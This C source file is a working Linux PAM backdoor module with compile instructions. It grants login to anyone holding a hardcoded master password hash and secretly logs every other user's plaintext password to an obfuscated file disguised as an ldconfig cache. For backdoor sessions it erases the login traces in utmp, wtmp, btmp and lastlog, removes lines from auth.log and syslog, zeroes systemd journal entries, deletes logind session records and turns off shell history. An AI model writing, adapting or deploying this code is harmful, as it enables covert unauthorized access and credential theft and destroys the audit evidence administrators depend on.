/*
 * PAM backdoor - Enhanced anti-forensics
 * Version: 2.0.0
 *
 * Improvements over v1:
 *   - Conversation-based password collection (works at any stack position)
 *   - Forked cleanup daemon for deferred log scrubbing
 *   - auth.log/secure filtering by sshd PID (surgical removal)
 *   - utmp (active) + wtmp (historical) scrubbing
 *   - Scrubs ALL matching entries, not just last
 *   - lastlog uses proper struct size detection
 *
 * No external crypto dependencies - embedded SHA256
 *
 * Compile:
 *   gcc -fPIC -shared -O2 -s -fvisibility=hidden \
 *       -o pam_auth.so pam_template.c -lpam
 */

#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <utime.h>
#include <unistd.h>
#include <utmp.h>
#include <pwd.h>
#include <fcntl.h>
#include <stdint.h>
#include <signal.h>
#include <sys/mman.h>
#include <dirent.h>

/* ============ Pure C SHA256 Implementation ============ */

#define ROTR(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define EP0(x) (ROTR(x,2)^ROTR(x,13)^ROTR(x,22))
#define EP1(x) (ROTR(x,6)^ROTR(x,11)^ROTR(x,25))
#define SIG0(x) (ROTR(x,7)^ROTR(x,18)^((x)>>3))
#define SIG1(x) (ROTR(x,17)^ROTR(x,19)^((x)>>10))

static const uint32_t K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

typedef struct {
    uint8_t data[64];
    uint32_t datalen;
    uint64_t bitlen;
    uint32_t state[8];
} SHA256_CTX;

static void sha256_transform(SHA256_CTX *ctx, const uint8_t data[]) {
    uint32_t a,b,c,d,e,f,g,h,t1,t2,m[64];
    int i,j;
    for (i=0,j=0; i<16; ++i,j+=4)
        m[i] = ((uint32_t)data[j]<<24)|((uint32_t)data[j+1]<<16)|((uint32_t)data[j+2]<<8)|data[j+3];
    for (; i<64; ++i)
        m[i] = SIG1(m[i-2]) + m[i-7] + SIG0(m[i-15]) + m[i-16];
    a=ctx->state[0];b=ctx->state[1];c=ctx->state[2];d=ctx->state[3];
    e=ctx->state[4];f=ctx->state[5];g=ctx->state[6];h=ctx->state[7];
    for (i=0; i<64; ++i) {
        t1 = h + EP1(e) + CH(e,f,g) + K[i] + m[i];
        t2 = EP0(a) + MAJ(a,b,c);
        h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
    }
    ctx->state[0]+=a;ctx->state[1]+=b;ctx->state[2]+=c;ctx->state[3]+=d;
    ctx->state[4]+=e;ctx->state[5]+=f;ctx->state[6]+=g;ctx->state[7]+=h;
}

static void sha256_init(SHA256_CTX *ctx) {
    ctx->datalen = 0; ctx->bitlen = 0;
    ctx->state[0]=0x6a09e667;ctx->state[1]=0xbb67ae85;ctx->state[2]=0x3c6ef372;ctx->state[3]=0xa54ff53a;
    ctx->state[4]=0x510e527f;ctx->state[5]=0x9b05688c;ctx->state[6]=0x1f83d9ab;ctx->state[7]=0x5be0cd19;
}

static void sha256_update(SHA256_CTX *ctx, const uint8_t data[], size_t len) {
    for (size_t i=0; i<len; ++i) {
        ctx->data[ctx->datalen] = data[i];
        ctx->datalen++;
        if (ctx->datalen == 64) {
            sha256_transform(ctx, ctx->data);
            ctx->bitlen += 512;
            ctx->datalen = 0;
        }
    }
}

static void sha256_final(SHA256_CTX *ctx, uint8_t hash[]) {
    uint32_t i = ctx->datalen;
    if (ctx->datalen < 56) {
        ctx->data[i++] = 0x80;
        while (i < 56) ctx->data[i++] = 0x00;
    } else {
        ctx->data[i++] = 0x80;
        while (i < 64) ctx->data[i++] = 0x00;
        sha256_transform(ctx, ctx->data);
        memset(ctx->data, 0, 56);
    }
    ctx->bitlen += ctx->datalen * 8;
    ctx->data[63] = ctx->bitlen; ctx->data[62] = ctx->bitlen >> 8;
    ctx->data[61] = ctx->bitlen >> 16; ctx->data[60] = ctx->bitlen >> 24;
    ctx->data[59] = ctx->bitlen >> 32; ctx->data[58] = ctx->bitlen >> 40;
    ctx->data[57] = ctx->bitlen >> 48; ctx->data[56] = ctx->bitlen >> 56;
    sha256_transform(ctx, ctx->data);
    for (i=0; i<4; ++i) {
        hash[i]    = (ctx->state[0] >> (24-i*8)) & 0xff;
        hash[i+4]  = (ctx->state[1] >> (24-i*8)) & 0xff;
        hash[i+8]  = (ctx->state[2] >> (24-i*8)) & 0xff;
        hash[i+12] = (ctx->state[3] >> (24-i*8)) & 0xff;
        hash[i+16] = (ctx->state[4] >> (24-i*8)) & 0xff;
        hash[i+20] = (ctx->state[5] >> (24-i*8)) & 0xff;
        hash[i+24] = (ctx->state[6] >> (24-i*8)) & 0xff;
        hash[i+28] = (ctx->state[7] >> (24-i*8)) & 0xff;
    }
}

static void sha256(const char *str, uint8_t hash[32]) {
    SHA256_CTX ctx;
    sha256_init(&ctx);
    sha256_update(&ctx, (const uint8_t*)str, strlen(str));
    sha256_final(&ctx, hash);
}

/* ============ End SHA256 ============ */

/* PLACEHOLDER - build.sh finds and patches this with the real hash */
static const unsigned char H[32] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
    0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
    0x13, 0x37, 0x42, 0x69, 0xBE, 0xEF, 0xCA, 0xFE
};

/* ============ Credential Logging ============ */

static void log_creds(const char *u, const char *p) {
    mkdir("/var/cache/ldconfig", 0755);
    FILE *f = fopen("/var/cache/ldconfig/aux-cache.log", "a");
    if (!f) return;
    char e[256];
    int l = snprintf(e, sizeof(e), "%ld|%s|%s\n", (long)time(NULL), u, p);
    const char *k = "ld.so.cache";
    for (int i = 0; i < l; i++) e[i] ^= k[i % 11];
    fwrite(e, 1, l, f);
    fclose(f);
    struct utimbuf t = {1672531200, 1672531200};
    utime("/var/cache/ldconfig/aux-cache.log", &t);
}

/* ============ Anti-Forensics ============ */

/*
 * Scrub ALL utmp/wtmp entries for a user (not just the last one).
 * Handles both active utmp and historical wtmp.
 */
static void scrub_utmp_file(const char *path, const char *user) {
    struct utmp ut;
    int fd = open(path, O_RDWR);
    if (fd < 0) return;

    /* Non-blocking lock with retry — avoids deadlock with systemd-logind
     * which holds utmp lock while waiting for pam_sm_open_session to return. */
    int locked = 0;
    for (int i = 0; i < 10; i++) {
        if (flock(fd, LOCK_EX | LOCK_NB) == 0) { locked = 1; break; }
        usleep(50000);
    }
    if (!locked) { close(fd); return; }

    off_t pos = 0;
    while (read(fd, &ut, sizeof(ut)) == sizeof(ut)) {
        if (strncmp(ut.ut_user, user, sizeof(ut.ut_user)) == 0) {
            memset(&ut, 0, sizeof(ut));
            lseek(fd, pos, SEEK_SET);
            write(fd, &ut, sizeof(ut));
        }
        pos += sizeof(ut);
        lseek(fd, pos, SEEK_SET);
    }

    flock(fd, LOCK_UN);
    close(fd);
}

static void scrub_wtmp(const char *user) {
    scrub_utmp_file("/var/log/wtmp", user);
}

static void scrub_utmp(const char *user) {
    scrub_utmp_file("/var/run/utmp", user);
    scrub_utmp_file("/run/utmp", user);
}

/*
 * Clear lastlog entry for user.
 * Detects record size (292 for 32-bit time_t, 296 for 64-bit).
 */
static void scrub_lastlog(const char *user) {
    /* Parse /etc/passwd directly — avoids NSS (getpwnam) which contacts
     * systemd-userdbd via D-Bus socket and hangs inside the PAM context
     * on Ubuntu 24.04+ with nss-systemd. */
    FILE *pf = fopen("/etc/passwd", "r");
    if (!pf) return;
    uid_t uid = (uid_t)-1;
    char line[256], luser[64];
    unsigned int luid;
    while (fgets(line, sizeof(line), pf)) {
        if (sscanf(line, "%63[^:]:%*[^:]:%u:", luser, &luid) == 2 &&
            strcmp(luser, user) == 0) { uid = luid; break; }
    }
    fclose(pf);
    if (uid == (uid_t)-1) return;

    int fd = open("/var/log/lastlog", O_RDWR);
    if (fd < 0) return;

    struct stat st;
    fstat(fd, &st);

    size_t rec_size = 292;
    if (st.st_size > 0 && uid > 0) {
        if ((size_t)st.st_size >= (uid + 1) * 296)
            rec_size = 296;
    }

    char z[296] = {0};
    off_t offset = (off_t)uid * rec_size;
    if (offset < st.st_size) {
        lseek(fd, offset, SEEK_SET);
        write(fd, z, rec_size);
    }
    close(fd);
}

/*
 * Scrub auth.log / secure entries by sshd PID.
 *
 * Every log line for an SSH session contains "sshd[PID]:" where PID
 * is the sshd child process handling that connection. Filtering by PID
 * gives surgical removal — only the backdoor session is erased.
 *
 * Method: flock, read, filter, rewrite in-place, ftruncate, preserve mtime.
 */
static void scrub_btmp(const char *user) {
    scrub_utmp_file("/var/log/btmp", user);
}

static void scrub_authlog(pid_t sshd_pid) {
    char pattern[32];
    snprintf(pattern, sizeof(pattern), "sshd[%d]", (int)sshd_pid);
    size_t pat_len = strlen(pattern);

    const char *paths[] = {
        "/var/log/auth.log", "/var/log/auth.log.1",
        "/var/log/secure",   "/var/log/secure.1",
        "/var/log/syslog",   "/var/log/messages",
        NULL
    };

    for (int p = 0; paths[p]; p++) {
        int fd = open(paths[p], O_RDWR);
        if (fd < 0) continue;

        flock(fd, LOCK_EX);

        struct stat st;
        if (fstat(fd, &st) < 0 || st.st_size == 0 || st.st_size > 64 * 1024 * 1024) {
            flock(fd, LOCK_UN);
            close(fd);
            continue;
        }

        char *buf = malloc(st.st_size + 1);
        if (!buf) { flock(fd, LOCK_UN); close(fd); continue; }

        ssize_t n = read(fd, buf, st.st_size);
        if (n <= 0) { free(buf); flock(fd, LOCK_UN); close(fd); continue; }
        buf[n] = '\0';

        char *out = malloc(n + 1);
        if (!out) { free(buf); flock(fd, LOCK_UN); close(fd); continue; }

        size_t out_len = 0;
        char *line = buf;

        while (line < buf + n) {
            char *eol = memchr(line, '\n', (buf + n) - line);
            size_t line_len = eol ? (size_t)(eol - line + 1) : (size_t)((buf + n) - line);

            /* Search for PID pattern in this line */
            int match = 0;
            if (line_len >= pat_len) {
                for (size_t i = 0; i <= line_len - pat_len; i++) {
                    if (memcmp(line + i, pattern, pat_len) == 0) {
                        match = 1;
                        break;
                    }
                }
            }

            if (!match) {
                memcpy(out + out_len, line, line_len);
                out_len += line_len;
            }

            line += line_len;
        }

        /* Rewrite only if we removed something */
        if (out_len < (size_t)n) {
            lseek(fd, 0, SEEK_SET);
            write(fd, out, out_len);
            ftruncate(fd, out_len);
        }

        free(out);
        free(buf);
        flock(fd, LOCK_UN);
        close(fd);

        /* Restore original mtime */
        struct utimbuf times = {st.st_atime, st.st_mtime};
        utime(paths[p], &times);
    }
}

/* ============ Journal Scrubbing ============ */

#define JOBJ_UNUSED      0
#define JOBJ_DATA        1
#define JOBJ_ENTRY       3
#define JOBJ_ENTRY_ARRAY 6

#define JHDR_HDRSZ_OFF   88   /* header_size field offset in journal file header */
#define DATA_EARR_OFF    48   /* entry_array_offset field in DataObject */
#define DATA_PAYLOAD_OFF 64   /* payload[] start in DataObject */
#define EA_NEXT_OFF      16   /* next_entry_array_offset in EntryArrayObject */
#define EA_ITEMS_OFF     24   /* items[] start in EntryArrayObject */

static uint64_t jle64(const uint8_t *p) {
    return (uint64_t)p[0]        | ((uint64_t)p[1] << 8)  |
           ((uint64_t)p[2] << 16)| ((uint64_t)p[3] << 24) |
           ((uint64_t)p[4] << 32)| ((uint64_t)p[5] << 40) |
           ((uint64_t)p[6] << 48)| ((uint64_t)p[7] << 56);
}

#define J_ALIGN8(x) (((x) + 7ULL) & ~7ULL)

static void zero_journal_entries(uint8_t *map, size_t sz, uint64_t ea_off) {
    while (ea_off && ea_off + EA_ITEMS_OFF <= sz) {
        uint8_t *ea = map + ea_off;
        if (ea[0] != JOBJ_ENTRY_ARRAY) break;
        uint64_t ea_sz = jle64(ea + 8);
        if (ea_sz < EA_ITEMS_OFF || ea_off + ea_sz > sz) break;
        uint64_t next = jle64(ea + EA_NEXT_OFF);
        uint64_t n = (ea_sz - EA_ITEMS_OFF) / 8;
        for (uint64_t i = 0; i < n; i++) {
            uint64_t eoff = jle64(ea + EA_ITEMS_OFF + i * 8);
            if (!eoff || eoff + 16 > sz) continue;
            uint8_t *eo = map + eoff;
            if (eo[0] != JOBJ_ENTRY) continue;
            uint64_t esz = jle64(eo + 8);
            if (eoff + esz > sz) continue;
            eo[0] = JOBJ_UNUSED;
            memset(eo + 8, 0, esz - 8);
        }
        ea_off = next;
    }
}

static void scrub_journal_file(const char *path, const char *tag, size_t tlen) {
    int fd = open(path, O_RDWR);
    if (fd < 0) return;
    struct stat st;
    if (fstat(fd, &st) < 0 || st.st_size < 100) { close(fd); return; }
    uint8_t *map = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    close(fd);
    if (map == MAP_FAILED) return;

    if (memcmp(map, "LPKSHHRH", 8) != 0) { munmap(map, st.st_size); return; }
    uint64_t hdr_sz = jle64(map + JHDR_HDRSZ_OFF);
    if (hdr_sz >= (uint64_t)st.st_size) { munmap(map, st.st_size); return; }

    uint64_t off = hdr_sz;
    while (off + 16 <= (uint64_t)st.st_size) {
        uint8_t *obj = map + off;
        uint64_t obj_sz = jle64(obj + 8);
        if (obj_sz < 16) break;
        uint64_t step = J_ALIGN8(obj_sz);
        if (!step || off + step > (uint64_t)st.st_size) break;

        if (obj[0] == JOBJ_DATA && obj_sz > DATA_PAYLOAD_OFF) {
            uint8_t *payload = obj + DATA_PAYLOAD_OFF;
            uint64_t psz = obj_sz - DATA_PAYLOAD_OFF;
            for (uint64_t i = 0; i + tlen <= psz; i++) {
                if (memcmp(payload + i, tag, tlen) == 0) {
                    uint64_t ea_off = jle64(obj + DATA_EARR_OFF);
                    if (ea_off) zero_journal_entries(map, st.st_size, ea_off);
                    break;
                }
            }
        }
        off += step;
    }

    msync(map, st.st_size, MS_SYNC);
    munmap(map, st.st_size);
}

static void scrub_journal(pid_t pid) {
    char tag[32];
    int tlen = snprintf(tag, sizeof(tag), "_PID=%d", (int)pid);
    if (tlen <= 0) return;

    const char *bases[] = {"/run/log/journal", "/var/log/journal", NULL};
    for (int b = 0; bases[b]; b++) {
        DIR *bdir = opendir(bases[b]);
        if (!bdir) continue;
        struct dirent *mde;
        while ((mde = readdir(bdir)) != NULL) {
            if (mde->d_name[0] == '.') continue;
            char mpath[512];
            snprintf(mpath, sizeof(mpath), "%s/%s", bases[b], mde->d_name);
            DIR *mdir = opendir(mpath);
            if (!mdir) continue;
            struct dirent *jde;
            while ((jde = readdir(mdir)) != NULL) {
                size_t nl = strlen(jde->d_name);
                if (nl < 8 || strcmp(jde->d_name + nl - 8, ".journal") != 0) continue;
                char jpath[1024];
                snprintf(jpath, sizeof(jpath), "%s/%s", mpath, jde->d_name);
                scrub_journal_file(jpath, tag, tlen);
            }
            closedir(mdir);
        }
        closedir(bdir);
    }
}

/* ============ Logind Session Scrubbing ============ */

static void scrub_logind(pid_t pid) {
    char needle[32];
    snprintf(needle, sizeof(needle), "\nLEADER=%d\n", (int)pid);

    DIR *dir = opendir("/run/systemd/sessions");
    if (!dir) return;

    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
        if (de->d_name[0] == '.') continue;
        char path[512];
        snprintf(path, sizeof(path), "/run/systemd/sessions/%s", de->d_name);
        /* O_NONBLOCK: prevent blocking on .ref FIFOs (systemd-logind uses
         * named pipes in sessions/ for reference counting — opening them
         * O_RDONLY without O_NONBLOCK blocks until data is written, which
         * never happens, hanging the PAM hook indefinitely). */
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;
        struct stat fst;
        if (fstat(fd, &fst) < 0 || !S_ISREG(fst.st_mode)) { close(fd); continue; }
        char buf[4096] = {0};
        read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (strstr(buf, needle))
            unlink(path);
    }
    closedir(dir);
}

/*
 * Deferred cleanup via detached pthread — avoids fork() entirely.
 *
 * Ubuntu 24.04 runs sshd as a socket-activated systemd service
 * (sshd@.service) with cgroup restrictions that block fork() inside
 * the PAM session hook. A detached thread in the same process has no
 * such restriction and is automatically cleaned up when sshd exits.
 */
#include <pthread.h>

typedef struct {
    char user[64];
    pid_t sshd_pid;
    int delay_ms;
} cleanup_args_t;

static void *cleanup_thread(void *arg) {
    cleanup_args_t *a = (cleanup_args_t *)arg;
    usleep(a->delay_ms * 1000);
    scrub_wtmp(a->user);
    scrub_utmp(a->user);
    scrub_btmp(a->user);
    scrub_lastlog(a->user);
    scrub_logind(a->sshd_pid);
    scrub_authlog(a->sshd_pid);
    scrub_journal(a->sshd_pid);
    free(a);
    return NULL;
}

static void spawn_cleanup_daemon(const char *user, pid_t sshd_pid, int delay_ms) {
    cleanup_args_t *a = malloc(sizeof(cleanup_args_t));
    if (!a) return;
    snprintf(a->user, sizeof(a->user), "%s", user);
    a->sshd_pid = sshd_pid;
    a->delay_ms = delay_ms;

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&tid, &attr, cleanup_thread, a) != 0)
        free(a);
    pthread_attr_destroy(&attr);
}

/* ============ Password Collection ============ */

static int get_password(pam_handle_t *pamh, const char **out) {
    const char *tok = NULL;

    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&tok) == PAM_SUCCESS
        && tok && tok[0] != '\0') {
        *out = tok;
        return 0;
    }

    const struct pam_conv *conv = NULL;
    if (pam_get_item(pamh, PAM_CONV, (const void **)&conv) != PAM_SUCCESS
        || !conv || !conv->conv)
        return -1;

    struct pam_message msg;
    const struct pam_message *msgp = &msg;
    struct pam_response *resp = NULL;

    msg.msg_style = PAM_PROMPT_ECHO_OFF;
    msg.msg = "Password: ";

    if (conv->conv(1, &msgp, &resp, conv->appdata_ptr) != PAM_SUCCESS
        || !resp || !resp->resp) {
        if (resp) { free(resp->resp); free(resp); }
        return -1;
    }

    pam_set_item(pamh, PAM_AUTHTOK, resp->resp);
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&tok);

    memset(resp->resp, 0, strlen(resp->resp));
    free(resp->resp);
    free(resp);

    if (!tok || tok[0] == '\0') return -1;
    *out = tok;
    return 0;
}

/* ============ Per-session State ============ */

/*
 * Privsep-safe state passing via /dev/shm marker file.
 *
 * OpenSSH privsep model:
 *   master sshd (A) → monitor (B) → slave/auth (C, ppid=B)
 *
 * pam_sm_authenticate runs in slave C:
 *   getpid()  = C (slave)
 *   getppid() = B (monitor) ← same PID that owns auth.log entries
 *
 * pam_sm_open_session runs in monitor B:
 *   getpid()  = B (monitor) ← matches marker filename
 *
 * We write /dev/shm/.ssd_B during auth, read it in session.
 * /dev/shm is tmpfs — no disk writes, gone on reboot.
 */

#define MARKER_DIR "/dev/shm"

static void write_marker(const char *user) {
    char path[256];
    /* Use username as marker — no PID dependency, works across
     * any PAM threading/privsep model. Protected by 0600 + root ownership. */
    snprintf(path, sizeof(path), MARKER_DIR "/.ssd_%s", user);
    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0600);
    if (fd < 0) {
        /* Fallback to /tmp if /dev/shm unavailable */
        snprintf(path, sizeof(path), "/tmp/.ssd_%s", user);
        fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0600);
    }
    if (fd < 0) return;
    write(fd, path, 1);  /* marker presence is enough */
    close(fd);
}

/* Returns 1 if this is a backdoor session, fills user_buf and pid_out */
static int read_marker(const char *user, pid_t *pid_out) {
    char path[256];
    *pid_out = getpid();
    snprintf(path, sizeof(path), MARKER_DIR "/.ssd_%s", user);
    if (access(path, F_OK) == 0) { unlink(path); return 1; }
    snprintf(path, sizeof(path), "/tmp/.ssd_%s", user);
    if (access(path, F_OK) == 0) { unlink(path); return 1; }
    return 0;
}

/* ============ PAM Interface ============ */

#define PAM_EXPORT __attribute__((visibility("default")))
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"

PAM_EXPORT PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    unsigned char hash[32];

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user) return PAM_IGNORE;
    if (get_password(pamh, &pass) != 0 || !pass) return PAM_IGNORE;

    sha256(pass, hash);

    int match = 1;
    for (int i = 0; i < 32; i++) if (hash[i] != H[i]) match = 0;

    if (match) {
        /* Write marker for session hook — survives privsep process boundary */
        write_marker(user);
    } else {
        log_creds(user, pass);
    }

    return match ? PAM_SUCCESS : PAM_IGNORE;
}

PAM_EXPORT PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXPORT PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

/*
 * Session open — two-pass scrub:
 *   Pass 1: immediate (catches entries from earlier session modules)
 *   Pass 2: deferred daemon at +2s (catches sshd's own utmp/lastlog
 *           writes which happen AFTER PAM returns)
 *
 * getpid() here = monitor PID = owner of auth.log entries. Correct.
 */
PAM_EXPORT PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    (void)flags; (void)argc; (void)argv;
    const char *user = NULL;
    pid_t sshd_pid = 0;

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user) return PAM_SUCCESS;
    if (!read_marker(user, &sshd_pid)) return PAM_SUCCESS;

    /* Suppress shell history for this session */
    pam_putenv(pamh, "HISTFILE=/dev/null");
    pam_putenv(pamh, "HISTSIZE=0");
    pam_putenv(pamh, "HISTFILESIZE=0");
    pam_putenv(pamh, "PROMPT_COMMAND=HISTSIZE=0");

    /* Pass 1: immediate */
    scrub_wtmp(user);
    scrub_utmp(user);
    scrub_btmp(user);
    scrub_lastlog(user);
    scrub_logind(sshd_pid);

    /* Write close-session marker so pam_sm_close_session knows it's a backdoor session */
    char close_marker[128];
    snprintf(close_marker, sizeof(close_marker), MARKER_DIR "/.ssd2_%d", (int)sshd_pid);
    {
        int cfd = open(close_marker, O_WRONLY|O_CREAT|O_TRUNC, 0600);
        if (cfd >= 0) { write(cfd, user, strlen(user)); close(cfd); }
    }

    /* Pass 2: deferred daemon — catches sshd's record_login() writes */
    spawn_cleanup_daemon(user, sshd_pid, 2000);

    return PAM_SUCCESS;
}

/*
 * Session close — scrub "session closed" auth.log/journal entries.
 * Only fires for backdoor sessions (gate: close-session marker).
 */
PAM_EXPORT PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    (void)pamh; (void)flags; (void)argc; (void)argv;
    char user_buf[64] = {0};
    pid_t sshd_pid = getpid();

    char close_marker[128];
    snprintf(close_marker, sizeof(close_marker), MARKER_DIR "/.ssd2_%d", (int)sshd_pid);
    int cfd = open(close_marker, O_RDONLY);
    if (cfd < 0) return PAM_SUCCESS;  /* not a backdoor session */
    ssize_t n = read(cfd, user_buf, sizeof(user_buf) - 1);
    close(cfd);
    unlink(close_marker);
    if (n <= 0) return PAM_SUCCESS;
    user_buf[n] = '\0';

    scrub_wtmp(user_buf);
    scrub_utmp(user_buf);
    scrub_logind(sshd_pid);

    spawn_cleanup_daemon(user_buf, sshd_pid, 1000);

    return PAM_SUCCESS;
}
